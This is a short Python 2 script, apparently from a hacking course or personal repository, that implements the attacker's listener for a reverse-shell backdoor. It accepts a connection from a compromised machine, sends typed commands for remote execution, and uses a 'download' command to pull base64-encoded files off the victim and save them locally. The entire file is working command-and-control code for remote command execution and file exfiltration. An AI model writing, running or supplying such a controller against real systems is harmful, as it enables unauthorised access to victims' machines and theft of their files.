#!/usr/bin/env python

# Created by un4ckn0wl3z-level99
# Website -> www.un4ckn0wl3z.xyz
# Date -> 7/28/2018

import socket
import json
import base64

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print "[+] Waiting for incoming connection"
        self.connection, address = listener.accept()
        print "[+] Got a connection from " + str(address)
        result = self.connection.recv(1024)
        print result

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(2048)
                return json.loads(json_data)
            except ValueError:
                continue

    def exec_remote(self,cmd):
        self.reliable_send(cmd)
        if cmd[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_recv()

    def write_file(self,path,content):
        with open(path,"wb") as target_file:
            target_file.write(base64.b64decode(content))
            return "[+] Download Successful."

    def run(self):
        while True:
            cmd = raw_input(">> ")
            if not cmd:
                continue
            cmd = cmd.split(" ")
            result = self.exec_remote(cmd)
            if cmd[0] == "download" and len(cmd) > 1:
                result = self.write_file(cmd[1],result)
            print result


listener = Listener("127.0.0.1",2508)
listener.run()

